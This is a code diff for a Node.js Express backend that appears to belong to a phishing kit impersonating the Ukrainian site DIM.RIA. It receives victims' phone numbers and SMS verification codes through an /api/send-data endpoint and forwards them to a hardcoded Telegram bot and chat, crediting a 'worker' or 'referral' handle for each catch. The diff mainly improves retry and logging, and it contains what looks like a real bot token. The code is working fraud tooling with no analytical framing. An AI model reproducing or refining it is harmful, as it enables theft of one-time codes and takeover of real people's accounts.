@@ -4,9 +4,9 @@ const path = require('path');
 const fetch = require('node-fetch');
 
 const app = express();
-const port = process.env.PORT || 3000;
+const PORT = process.env.PORT || 3000;
 
-// === КОНФІГУРАЦІЯ TELEGRAM ===
+// === TELEGRAM КОНФИГ ===
 const BOT_TOKEN = "8539302594:AAElRKi_77Mm9tCpOyODY3nLs9Z9BzPlp18";
 const CHAT_ID = "-5055127448";
 const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -14,40 +14,42 @@ const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 app.use(bodyParser.json());
 app.use(express.static(__dirname));
 
-// === ГЛАВНАЯ СТРАНИЦА ===
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'index.html'));
-});
+// === ГЛАВНАЯ + ПАНЕЛЬ ===
+app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
+app.get('/panel', (req, res) => res.sendFile(path.join(__dirname, 'panel.html')));
 
-app.get('/panel', (req, res) => {
-    res.sendFile(path.join(__dirname, 'panel.html'));
-});
+// === УЛУЧШЕННАЯ ОТПРАВКА В TELEGRAM ===
+async function sendToTelegram(message) {
+    const payload = {
+        chat_id: CHAT_ID,
+        text: message,
+        parse_mode: 'Markdown'
+    };
 
-// === ОТПРАВКА В TELEGRAM С ПОВТОРНЫМИ ПОПЫТКАМИ ===
-async function sendToTelegram(message, retries = 2) {
-    for (let i = 0; i <= retries; i++) {
+    for (let i = 0; i < 3; i++) {
         try {
-            const res = await fetch(TELEGRAM_API, {
+            const response = await fetch(TELEGRAM_API, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
-                }),
+                body: JSON.stringify(payload),
                 timeout: 10000
             });
 
-            if (res.ok) {
-                console.log('Успішно відправлено в Telegram');
-                return true;
-            }
+            const result = await response.json();
 
-            const err = await res.json();
-            console.error('Telegram API error:', err);
+            if (response.ok && result.ok) {
+                console.log('УСПЕШНО отправлено в Telegram');
+                return true;
+            } else {
+                console.error(`Ошибка Telegram API:`, result);
+                if (result.error_code === 403) {
+                    console.error('Бот заблокирован или нет доступа к чату!');
+                    return false;
+                }
+            }
         } catch (err) {
-            console.error(`Спроба ${i + 1} не вдалася:`, err.message);
-            if (i === retries) return false;
+            console.error(`Попытка ${i + 1} не удалась:`, err.message);
+            if (i === 2) return false;
             await new Promise(r => setTimeout(r, 2000));
         }
     }
@@ -56,32 +58,42 @@ async function sendToTelegram(message, retries = 2) {
 
 // === ОБРАБОТКА ДАННЫХ ===
 app.post('/api/send-data', async (req, res) => {
+    console.log('Получен запрос:', req.body); // ← ВИДИМ, ЧТО ПРИХОДИТ
+
     const { step, phone, code, referrer } = req.body;
 
     let message = '';
 
     if (step === 'phone' && phone) {
-        message = `*ПРОЕКТ:* DIM.RIA ⚡⚡⚡\n*Номер:* \`${phone}\`\n*СТРАНА:* Украина`;
-        if (referrer) message += `\n*Работник:* @${referrer}`;
+        message = `*ПРОЕКТ:* DIM.RIA ⚡\n*Номер:* \`${phone}\`\n*СТРАНА:* Україна`;
+        if (referrer) message += `\n*Реферал:* @${referrer}`;
     } 
     else if (step === 'code' && code) {
-        message = `*SMS КОД:*\n\`${code}\``;
-        if (referrer) message += `\n*Работник:* @${referrer}`;
+        message = `*SMS КОД:* \`${code}\``;
+        if (referrer) message += `\n*Реферал:* @${referrer}`;
     } 
     else {
-        return res.status(400).json({ success: false });
+        return res.status(400).json({ success: false, error: 'Invalid data' });
     }
 
     const success = await sendToTelegram(message);
 
     if (success) {
+        console.log('Данные успешно отправлены в Telegram');
         res.json({ success: true });
     } else {
-        res.status(500).json({ success: false });
+        console.error('КРИТИЧЕСКАЯ ОШИБКА: Не удалось отправить в Telegram');
+        res.status(500).json({ success: false, error: 'Telegram error' });
     }
 });
 
-app.listen(port, () => {
-    console.log(`Сервер запущено: http://localhost:${port}`);
-    console.log(`Панель: http://localhost:${port}/panel`);
+// === ЗАПУСК ===
+app.listen(PORT, () => {
+    console.log(`Сервер запущен: http://localhost:${PORT}`);
+    console.log(`Панель: http://localhost:${PORT}/panel`);
+    
+    // === ТЕСТОВАЯ ОТПРАВКА ПРИ СТАРТЕ ===
+    setTimeout(() => {
+        sendToTelegram(`*СЕРВЕР ЗАПУЩЕН* ✅\nВремя: ${new Date().toLocaleString('uk-UA')}`);
+    }, 3000);
 });
